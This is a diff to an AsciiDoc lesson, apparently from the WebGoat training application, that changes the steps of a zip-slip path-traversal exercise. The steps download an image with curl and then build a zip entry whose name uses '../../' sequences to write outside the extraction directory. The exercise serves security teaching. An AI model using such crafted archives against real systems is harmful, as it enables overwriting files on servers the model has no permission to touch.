@@ -2,10 +2,10 @@
 
 First, let's create a zip file with an image inside:
 
-[source]
+[source, subs="macros"]
 ----
-curl -o cat.jpg http://localhost:8080/WebGoat/images/cats/1.jpg
-zip profile.zip cat.jpg
+curl -o webwolf.jpg webWolfRootLink:images/wolf.png[noLink, target=images/wolf.png]
+zip profile.zip webwolf.jpg
 ----
 
 Now let's upload this as our profile image. We can see nothing happens as mentioned in the assignment there is a bug in the software, and the result we see on the screen is:
@@ -23,7 +23,7 @@ First, create the directory structure:
 ----
 mkdir -p webGoatTempDir:temppath[]PathTraversal/username:user[]
 cd webGoatTempDir:temppath[]PathTraversal/username:user[]
-curl -o username:user[] http://localhost:8080/WebGoat/images/cats/1.jpg
+curl -o username:user[].jpg webWolfRootLink:images/wolf.png[noLink, target=images/wolf.png]
 zip profile.zip ../../../../../../../..webGoatTempDir:temppath[]PathTraversal/username:user[]/username:user[].jpg
 ----
 
